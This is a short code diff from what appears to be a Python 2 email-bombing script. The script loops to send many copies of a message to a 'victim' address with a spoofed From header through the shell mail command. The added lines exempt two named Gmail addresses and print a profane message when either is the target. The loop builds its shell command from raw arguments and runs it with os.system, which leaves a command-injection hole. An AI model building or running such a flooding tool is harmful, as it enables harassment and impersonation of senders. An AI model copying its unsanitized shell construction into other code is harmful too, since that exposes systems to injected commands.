@@ -34,6 +34,10 @@ subject = cmdline[3]
 message_body = cmdline[4]
 result = 0
 
+if victim == "matheusboy.mbs@gmail.com" or victim == "matheusboymbs@gmail.com":
+    print "FUCK YOU"
+    sys.exit(1)
+
 for i in range(0, limit):
     cmd = "echo \"" + message_body + " " + str(i) + "\" | mail -s \"" + subject + " " + str(i) + "\" -a \"From:" + spoof + "\" " + victim
     result = os.system(cmd)
